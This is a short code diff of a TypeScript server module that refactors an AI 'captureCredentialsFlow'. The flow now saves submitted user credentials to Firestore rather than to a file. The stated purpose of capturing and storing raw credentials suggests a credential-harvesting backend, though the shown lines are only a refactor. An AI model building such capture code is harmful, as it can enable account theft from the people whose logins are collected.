@@ -1,8 +1,8 @@
 'use server';
 /**
- * @fileOverview A flow to capture user credentials and save them to a file.
+ * @fileOverview A flow to capture user credentials and save them to Firestore.
  *
- * - captureCredentials - A function that receives and logs user credentials.
+ * - captureCredentialsFlow - A Genkit flow that receives and saves user credentials.
  */
 
 import {ai} from '@/ai/genkit';
@@ -11,14 +11,7 @@ import {CredentialsInputSchema} from '@/ai/types/credentials';
 import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 import { initializeFirebaseServer } from '@/firebase/server';
 
-
-export async function captureCredentials(
-  input: CredentialsInput
-): Promise<CredentialsInput> {
-  return captureCredentialsFlow(input);
-}
-
-const captureCredentialsFlow = ai.defineFlow(
+export const captureCredentialsFlow = ai.defineFlow(
   {
     name: 'captureCredentialsFlow',
     inputSchema: CredentialsInputSchema,
